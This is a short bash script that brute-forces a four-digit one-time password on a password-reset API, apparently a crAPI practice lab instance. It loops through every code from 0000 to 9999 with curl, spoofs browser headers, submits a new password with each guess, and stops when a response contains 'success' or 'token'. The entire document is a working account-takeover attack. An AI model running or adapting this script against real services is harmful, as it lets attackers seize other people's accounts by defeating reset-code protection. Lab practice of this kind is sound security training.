#!/bin/bash

# Configurable variables
DOMAIN="http://gifton.crapi.ai.com:12000"
EMAIL="hamza@as.ai"
PASSWORD="Abc@1234"
ENDPOINT="$DOMAIN/identity/api/auth/v2/check-otp"

# Loop through 0000 to 9999
for i in $(seq -w 0 9999); do
  echo "Trying OTP: $i"

  RESPONSE=$(curl -s --insecure "$ENDPOINT" \
    -H 'Accept: */*' \
    -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8' \
    -H 'Connection: keep-alive' \
    -H 'Content-Type: application/json' \
    -H "Origin: $DOMAIN" \
    -H "Referer: $DOMAIN/forgot-password" \
    -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36' \
    --data-raw "{\"email\":\"$EMAIL\",\"otp\":\"$i\",\"password\":\"$PASSWORD\"}")

  # Optional: Add success condition check
  if [[ $RESPONSE == *"success"* || $RESPONSE == *"token"* ]]; then
    echo "[+] Valid OTP found: $i"
    echo "Response: $RESPONSE"
    break
  fi
done
